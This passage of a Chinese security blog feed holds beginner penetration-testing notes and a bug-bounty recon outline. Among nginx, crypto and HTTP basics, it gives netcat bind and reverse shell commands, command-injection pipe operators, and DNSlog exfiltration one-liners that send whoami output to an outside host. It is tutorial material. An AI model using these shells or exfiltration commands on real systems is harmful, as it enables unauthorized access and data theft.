class="line">upstream fzjh&#123;</span><br><span class="line">server 1.1.1.1:80 weight=2;</span><br><span class="line">server 2.2.2.2:80 weight=1;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 定义访问路径和策略</span><br><span class="line">location / &#123;</span><br><span class="line">proxy_pass http://fzjh/;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>APP&#x2F;小程序应用开发架构：</p><p>1、原生开发</p><p>安卓一般用java开发，也有kotlin语言开发，效率和功能是最好的，难度也是最大的</p><p>2、H5开发</p><p>使用HBuilder X，一般就是H5➕Vue，会存在API和JS框架安全问题</p><p>3、使用flutter开发</p><p>谷歌推出的一款UI框架，使用dart语言开发，支持跨平台，weight渲染直接操作硬件层，但是技术比较新，生态还不完善</p><p>4、常规web开发</p><p>就是开发一个网站，然后加入app的壳。web app 一般非常小，内容都是app内的网页展示，受制于网页技术本身，可实现功能少，而且每次打开，几乎所有的内容都需要重新加载，所有反应速度慢，内容加载过多容易卡死。</p><h1 id="Web常规命令基础"><a href="#Web常规命令基础" class="headerlink" title="Web常规命令基础"></a>Web常规命令基础</h1><p>推荐个网站：<a href="https://forum.ywhack.com/bountytips.php">https://forum.ywhack.com/bountytips.php</a></p><p>在里面填一些基本信息会将命令显示出来</p><p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231217162209085.png" alt="image-20231217162209085"></p><p>文件上传下载：</p><p>Linux：wget，curl，python，ruby，perl，java等</p><p>Windows：PowerShell，Certutil，Bitsadmin，msiexec，mshta，rundll32等</p><p>反弹shell：</p><p>正向连接：即自己主动找别人，如Linux控制windows正向连接</p><p>在windows上绑定cmd到本地5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e cmd -lvvp 5566</span><br></pre></td></tr></table></figure><p>然后Linux主动连接windows的5566端口</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat ip 5566</span><br></pre></td></tr></table></figure><p>同理，windows控制Linux的话，在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e /bin/sh -lvvp 5566</span><br></pre></td></tr></table></figure><p>在windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc ip 5566</span><br></pre></td></tr></table></figure><p>反向连接：即别人主动来找我，我自己监听，如windows等待Linux反向连接</p><p>在Windows上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 5566</span><br></pre></td></tr></table></figure><p>在Linux上执行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ncat -e  /bin/sh windows的ip windows本地正在监听的端口</span><br></pre></td></tr></table></figure><p>管道符：</p><p>Windows：|  &amp;  ||   &amp;&amp;</p><p>Linux：;  |   ||   &amp;   &amp;&amp;   &#96;&#96;</p><p>用;号隔开每个命令, 每个命令按照从左到右的顺序,顺序执行， 彼此之间不关心是否失败， 所有命令都会执行</p><p>管道符“|”将两个命令隔开，管道符左边命令的输出就会作为管道符右边命令的输入。连续使用管道意味着第一个命令的输出会作为 第二个命令的输入，第二个命令的输出又会作为第三个命令的输入，依此类推，显示后面语句的执行结果</p><p>&amp;放在启动参数后面表示设置此进程为后台进程</p><p>只有在 &amp;&amp; 左边的命令返回真，&amp;&amp; 右边的命令才会被执行</p><p>只有在 || 左边的命令返回假，|| 右边的命令才会被执行，只要有一个命令返回真，后面的命令就不会被执行，即一直到返回真的地方停止执行</p><p>数据回显：除了上面的反弹shell方法，还可以外带数据查询，比如使用dnslog平台，ping `whoami`.xxx.dnslog.cn，如果有命令执行那就会看到whoami的执行结果。当然 ``仅限于Linux，如果遇到Windows的话，可以使用powershell</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell $a=whoami;$a=$a.replace(&#x27;\&#x27;,&#x27;rce&#x27;);$b=&#x27;.xxxxx.dnslog.cn&#x27;;$c=$a+$b;ping $c</span><br></pre></td></tr></table></figure><p> 为什么在windows下这么复杂？因为windows下cmd无法直接使用管道符去解析whoami，所有要使用powershell变量赋值，把whoami执行结果给到变量，但是ping的结果中带有 \ ，所有加个replace去替换</p><h1 id="抓包基础"><a href="#抓包基础" class="headerlink" title="抓包基础"></a>抓包基础</h1><h2 id="HTTP-HTTPS协议"><a href="#HTTP-HTTPS协议" class="headerlink" title="HTTP&#x2F;HTTPS协议"></a>HTTP&#x2F;HTTPS协议</h2><p>charles（茶杯）、Fiddler、burp，怎么安装使用网上一大堆，这里不多赘述。</p><p>抓微信小程序：可以使用charles抓包，然后转给burp分析；还可以使用proxifier</p><p>个人推荐使用proxifier，打开后在代理服务器中选择https，地址与端口和burp的保持一致，然后在代理规则中的应用程序输入wechat*.exe即可，这是在Windows上的方法，如果用mac的话，应用程序那里可以点 <strong>+</strong> 号</p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231221150617389.png" alt="image-20231221150617389" style="zoom: 50%;"><p>然后在Applications那里，搜索应用，如微信小程序</p><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231225102759395.png" alt="image-20231225102759395" style="zoom:50%;"><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20231225102852754.png" alt="image-20231225102852754" style="zoom:50%;"><p> 这个Mini Program 就是小程序的执行程序</p><p>PC应用：和抓微信小程序一样，也是用 proxifier➕burp 即可</p><h2 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h2><p>推荐工具：科来（没有mac版本，适合新手）、Wireshark </p><p> 模拟器的一些游戏抓取可以用一个封包监听工具，下载地址和使用说明可以去b站看看</p><p><a href="https://www.bilibili.com/video/BV19a411s7pf/?pop_share=1&vd_source=f0e85cdc73190cf042eeba2be6dba3cb">https://www.bilibili.com/video/BV19a411s7pf/?pop_share=1&amp;vd_source=f0e85cdc73190cf042eeba2be6dba3cb</a></p><h1 id="编码算法加密基础"><a href="#编码算法加密基础" class="headerlink" title="编码算法加密基础"></a>编码算法加密基础</h1><h2 id="加密-编码"><a href="#加密-编码" class="headerlink" title="加密&amp;编码"></a>加密&amp;编码</h2><h3 id="单向散列加密"><a href="#单向散列加密" class="headerlink" title="单向散列加密"></a>单向散列加密</h3><p>代表有 <strong>MD5</strong> ，常见的还有 <strong>SHA</strong> ， <strong>MAC</strong> ， <strong>CRC</strong></p><p>优点：方便存储，损耗低，加密对性能的损耗微乎其微</p><p>缺点：存在暴力破解的可能性，因此最好通过 <strong>加盐</strong> 的方式提高安全性，此外可能存在散列冲突</p><p><strong>MD5密文特点：</strong>由数字0-9和字母a-z组成，固定位数<strong>16位</strong>或<strong>32位</strong></p><p><strong>解密需求：</strong>知道密文即可，对于复杂明文很难碰撞出来</p><h3 id="base64编码"><a href="#base64编码" class="headerlink" title="base64编码"></a>base64编码</h3><p> 一般情况下密文尾部回忆两个等号&#x3D;&#x3D;，明文很少的时候则没有</p><p>明文越长密文越长，密文中一般不会出现 <strong>&#x2F;</strong></p><p>区分大小写</p><h3 id="对称加密"><a href="#对称加密" class="headerlink" title="对称加密"></a>对称加密</h3><p>代表有 <strong>AES</strong>，常见的还有 <strong>DES</strong> ， <strong>RC4</strong></p><p>优点：算法公开，计算量小，加密速度快，加密效率高</p><p>缺点：发送方和接收方必须商定好密钥，密钥管理可能存在问题</p><p><strong>AES、DES密文特点：</strong>和base64基本类似，但密文中一般会有 <strong>&#x2F;</strong> 和 <strong>+</strong>  </p><p><strong>解密需求：</strong>密文、模式、加密key，偏移量（ECB模式默认没有偏移量），条件满足方可解密</p><h3 id="非对称加密"><a href="#非对称加密" class="headerlink" title="非对称加密"></a>非对称加密</h3><p>代表有 <strong>RSA</strong> ，常见的还有 <strong>RSA2</strong> ， <strong>PKCS</strong></p><p>优点：比对称加密安全性更好，加解密需要不同的密钥，即 <strong>使用公钥加密就要使用私钥解密，使用私钥加密就要公钥解密</strong></p><p>缺点：加解密花费时间长，速度慢，只适合对少量数据进行加密</p><p><strong>密文特点：</strong>和AES相似，但是长度较长，同一明文每次加密他的密文都会变动</p><p><strong>解密需求：</strong>密文、公钥或私钥</p><h1 id="数据包基础"><a href="#数据包基础" class="headerlink" title="数据包基础"></a>数据包基础</h1><h2 id="请求"><a href="#请求" class="headerlink" title="请求"></a>请求</h2><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222721812.png" alt="image-20240102222721812" style="zoom:50%;"><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222442240.png" alt="image-20240102222442240" style="zoom:50%;"><h2 id="响应"><a href="#响应" class="headerlink" title="响应"></a>响应</h2><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222505717.png" alt="image-20240102222505717" style="zoom:50%;"><h2 id="状态码"><a href="#状态码" class="headerlink" title="状态码"></a>状态码</h2><img src="/2023/12/14/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95--%E5%9F%BA%E7%A1%80%E5%85%A5%E9%97%A8/image-20240102222756791.png" alt="image-20240102222756791" style="zoom:67%;"><p>在请求目录时，比如xxxxx&#x2F;sys&#x2F;admin&#x2F;为200 OK，而xxxxx&#x2F;sys&#x2F;为403，为什么？</p><p>原因是在访问xxxxx&#x2F;sys&#x2F;admin&#x2F;时，此目录下面有类似于index的指引页面，因此可以返回200；而xxxxx&#x2F;sys&#x2F;目录下没有类似于index的指引 页面，因此返回403，但是此目录是存在的，所以扫到目录显示403表示目录是存在的 </p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要写一点和web相关的基础知识，随便写写，不成系统&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;Web环境常规知识&quot;&gt;&lt;a href=&quot;#Web环境常规知识&quot; class=&quot;headerlink&quot; title=&quot;Web环境常规知识&quot;&gt;&lt;</summary>
      
    
    
    
    <category term="渗透测试" scheme="https://ink-scholar.github.io/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="WEB" scheme="https://ink-scholar.github.io/tags/WEB/"/>
    
    <category term="基础" scheme="https://ink-scholar.github.io/tags/%E5%9F%BA%E7%A1%80/"/>
    
  </entry>
  
  <entry>
    <title>SRC通用讲解</title>
    <link href="https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/"/>
    <id>https://ink-scholar.github.io/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/</id>
    <published>2023-11-24T13:12:12.413Z</published>
    <updated>2023-12-06T15:42:58.179Z</updated>
    
    <content type="html"><![CDATA[<p><em><strong>此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金</strong></em></p><h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><h2 id="网络空间搜索"><a href="#网络空间搜索" class="headerlink" title="网络空间搜索"></a>网络空间搜索</h2><h3 id="精准搜索"><a href="#精准搜索" class="headerlink" title="精准搜索"></a>精准搜索</h3><h4 id="域名搜索"><a href="#域名搜索" class="headerlink" title="域名搜索"></a>域名搜索</h4><p>Fofa：domain&#x3D;“baidu.com”</p><p>Hunter：domain.suffix&#x3D;”Baidu.com”</p><p>Google：site:baidu.com</p><h4 id="域名解析"><a href="#域名解析" class="headerlink" title="域名解析"></a>域名解析</h4><p>微步：<a href="https://x.threatbook.com/">https://x.threatbook.com/</a></p><p>360：<a href="https://ti.360.cn/">https://ti.360.cn/</a></p><p>旁站查询：<a href="https://webscan.cc/">https://webscan.cc</a>         （对于IP站更好一点）</p><h4 id="子域名工具"><a href="#子域名工具" class="headerlink" title="子域名工具"></a>子域名工具</h4><p>水泽：<a href="https://github.com/0x727/ShuiZe_0x727">https://github.com/0x727/ShuiZe_0x727</a></p><p>灯塔魔改版：<a href="https://github.com/ki9mu/ARL-plus-docker">https://github.com/ki9mu/ARL-plus-docker</a></p><p>Nemo：<a href="https://github.com/hanc00l/nemo_go">https://github.com/hanc00l/nemo_go</a></p><p>推荐灯塔魔改版</p><h4 id="企业查询"><a href="#企业查询" class="headerlink" title="企业查询"></a>企业查询</h4><p>小蓝本、企查查、爱企查、微信小程序、公众号</p><h3 id="模糊搜索"><a href="#模糊搜索" class="headerlink" title="模糊搜索"></a>模糊搜索</h3><h4 id="通用方法"><a href="#通用方法" class="headerlink" title="通用方法"></a>通用方法</h4><p>Github关键字搜索</p><p>网络空间搜索引擎body，title，ico特征，js特征搜索</p><p>通用系统搜索</p><p>CNVD通用搜索</p><p>EDU通用搜索</p><h4 id="短视频信息搜索"><a href="#短视频信息搜索" class="headerlink" title="短视频信息搜索"></a>短视频信息搜索</h4><p>抖音快手B站等，直接搜索内容，如：腾讯后台登录教程，可以看到一些url甚至是账号密码</p><h4 id="语雀搜索"><a href="#语雀搜索" class="headerlink" title="语雀搜索"></a>语雀搜索</h4><p> 语雀搜索是需要登录的，登录后可以进入页面 <a href="https://www.yuque.com/dashboard">https://www.yuque.com/dashboard</a> ，左上角会存在搜索</p><p>当然登陆客户端也有</p><img src="/2023/11/24/SRC%E9%80%9A%E7%94%A8%E8%AE%B2%E8%A7%A3/image-20231206224628687.png" alt="image-20231206224628687" style="zoom: 33%;"><h2 id><a href="#" class="headerlink" title></a></h2><h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><h1 id="条件竞争（并发）"><a href="#条件竞争（并发）" class="headerlink" title="条件竞争（并发）"></a>条件竞争（并发）</h1><h1 id="越权"><a href="#越权" class="headerlink" title="越权"></a>越权</h1><h1 id="CORS➕XSS"><a href="#CORS➕XSS" class="headerlink" title="CORS➕XSS"></a>CORS➕XSS</h1><h1 id="未授权"><a href="#未授权" class="headerlink" title="未授权"></a>未授权</h1><h1 id="SSRF➕RCE"><a href="#SSRF➕RCE" class="headerlink" title="SSRF➕RCE"></a>SSRF➕RCE</h1><h1 id="逻辑漏洞"><a href="#逻辑漏洞" class="headerlink" title="逻辑漏洞"></a>逻辑漏洞</h1><h1 id="云安全"><a href="#云安全" class="headerlink" title="云安全"></a>云安全</h1><h1 id="常见框架漏洞"><a href="#常见框架漏洞" class="headerlink" title="常见框架漏洞"></a>常见框架漏洞</h1>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;em&gt;&lt;strong&gt;此篇主要讲解src挖掘过程中的通用技巧，已方法为主，帮助快速刷src，赚点赏金&lt;/strong&gt;&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&quot;信息收集&quot;&gt;&lt;a href=&quot;#信息收集&quot; class=&quot;headerlink&quot; title=&quot;信息收集&quot;&gt;&lt;/a&gt;信</summary>
      
    
    
    
    <category term="SRC" scheme="https://ink-scholar.github.io/categories/SRC/"/>
    
    
    <category term="src" scheme="https://ink-scholar.github.io/tags/src/"/>
    
  </entry>
  
</feed>
